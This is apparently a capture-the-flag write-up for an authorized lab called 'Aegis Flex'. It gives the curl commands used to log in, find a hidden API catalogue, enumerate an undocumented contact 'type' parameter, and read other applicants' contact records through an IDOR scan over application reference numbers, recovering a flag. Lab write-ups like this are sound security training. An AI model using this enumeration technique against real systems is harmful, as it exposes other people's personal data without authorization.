# Aegis Flex — Contact `type=phone` IDOR

**Context:** PwnBox Aegis Flex lab (authorized)  
**Requires:** Valid portal session (`demo/demo`)

## Login

```bash
BASE="https://[host].pwnbox-lab.com"
curl -sS -c /tmp/aegis.cj -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo"}'
# -> {"ok":true}
# Cookies: session (base64 {"user":"demo"}) + session.sig
```

## Fetch hidden aegis catalogue

Dashboard loads `/apiendpoints/dashboard/serviceConfigs.json` (no contact). Fetch aegis map directly:

```bash
curl -sS -b /tmp/aegis.cj "$BASE/apiendpoints/aegis/serviceConfigs.json"
```

Key fields:

```json
"contactInformation": "aegis-contact-service-stg05-proxy/v6/applications",
"contactSubResource": "involved-parties/contacts"
```

## Contact type enumeration

Catalogue does not document `type`. Provoke error or probe:

```bash
ARN=1743465601777
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/$ARN/involved-parties/contacts?type=full"
# -> {"error":"unsupported contact type","supported":["summary","email","phone"]}
```

| type | Response shape |
|------|----------------|
| `summary` | `{"arn":"..."}` only |
| `email` | `arn` + `emails[]` |
| `phone` | full record + **`flag`** field |

## Flag retrieval — Mira Patel (finalised)

Notification n-3 hints Mira Patel application finalised. ARN from enumeration: `1743465601904`.

```bash
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/1743465601904/involved-parties/contacts?type=phone"
```

**Instance `89aacd38eb6c` flag:** `pwnbox{c1d0a9f8e7b6453221098a7b6c5d4e3f}`

## Control — own draft app (null flag)

```bash
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/1743465601777/involved-parties/contacts?type=phone"
# Jordan Demo -> "flag": null
```

## ARN enumeration (IDOR scan)

Valid records found in range `1743465600000–1743465609999` (14 hits on instance `89aacd38eb6c`). Pattern:

```bash
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/{ARN}/involved-parties/contacts?type=phone"
```

- `{"error":"application reference not found"}` → invalid ARN
- JSON with `name` → valid IDOR read
- Non-null `flag` → finalised application with token

## Why other tests failed

| Attempt | Result |
|---------|--------|
| Dashboard catalogue only | No contact path to discover from UI alone |
| `type=summary` (widget default) | No `flag` field |
| Routing POST new app | ARN not synced to contact DB |
| `/aegis/pib` UI | 403 Forbidden |
| Session tamper | Requires valid `session.sig` |

## Full URL template

```text
GET /{contactInformation}/{arn}/{contactSubResource}?type=phone
```

From aegis `serviceConfigs.json`:

```text
GET /aegis-contact-service-stg05-proxy/v6/applications/{arn}/involved-parties/contacts?type=phone
```
